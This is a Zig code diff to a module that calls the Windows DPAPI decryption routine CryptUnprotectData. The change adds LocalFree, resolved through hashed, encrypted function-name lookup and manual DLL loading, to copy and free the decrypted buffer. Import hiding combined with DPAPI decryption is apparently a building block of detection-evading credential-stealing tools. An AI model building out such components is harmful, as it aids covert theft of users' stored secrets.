@@ -21,13 +21,21 @@ const CryptUnprotectData_fn = *const fn (
 
 const CRYPTPROTECT_UI_FORBIDDEN: types.ULONG = 0x01;
 
+const LocalFree_fn = *const fn (ptr: ?*const anyopaque) callconv(.winapi) ?*anyopaque;
+
 var crypt_unprotect_data: ?CryptUnprotectData_fn = null;
+var local_free: ?LocalFree_fn = null;
 
 fn ensureInit() bool {
     if (crypt_unprotect_data != null) return true;
     const base = dll_loader.getOrLoadDll("crypt32.dll") orelse return false;
     crypt_unprotect_data = @ptrCast(@alignCast(
         export_resolve.getFunctionByHash(base, hash.encryptedHashFunc("CryptUnprotectData")) orelse return false,
+    ));
+
+    const k32 = dll_loader.getOrLoadDll("kernel32.dll") orelse return false;
+    local_free = @ptrCast(@alignCast(
+        export_resolve.getFunctionByHash(k32, hash.encryptedHashFunc("LocalFree")) orelse return false,
     ));
     return true;
 }
@@ -54,8 +62,15 @@ pub fn decrypt(input: []const u8) ?[]u8 {
 
     if (ret == 0) return null;
 
-    const result = @as([*]u8, @ptrCast(blob_out.pbData))[0..blob_out.cbData];
-    return result;
+    const alloc = std.heap.page_allocator;
+    const copy = alloc.alloc(u8, blob_out.cbData) orelse {
+        _ = local_free.?(blob_out.pbData);
+        return null;
+    };
+    @memcpy(copy, @as([*]u8, @ptrCast(blob_out.pbData))[0..blob_out.cbData]);
+    _ = local_free.?(blob_out.pbData);
+
+    return copy;
 }
 
 // ── Tests ──
